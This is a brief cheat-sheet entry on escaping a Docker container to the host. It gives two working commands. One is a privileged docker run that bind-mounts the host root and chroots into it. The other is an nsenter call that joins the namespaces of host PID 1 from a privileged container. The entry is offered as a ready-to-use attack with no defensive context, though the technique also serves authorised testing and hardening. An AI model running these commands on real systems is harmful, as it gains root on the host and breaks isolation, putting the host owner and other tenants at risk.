# Privileged Container Host Escape (Docker)

If you're inside a container that can talk to the Docker daemon (socket mounted, or `docker` CLI works), spin up a privileged container bind-mounting the host root:

```bash
docker run --rm --privileged --pid=host --net=host -v /:/host alpine:3.20 chroot /host /bin/sh
```

If you can't talk to the daemon directly but you're already in a container started with `--privileged --pid=host`, confirm PID 1 is the host's init, then jump into all of its namespaces:

```bash
cat /proc/1/comm           # if this is systemd/init, PID 1 is the host's
nsenter -t 1 -a -- sh -c '<command>'
```
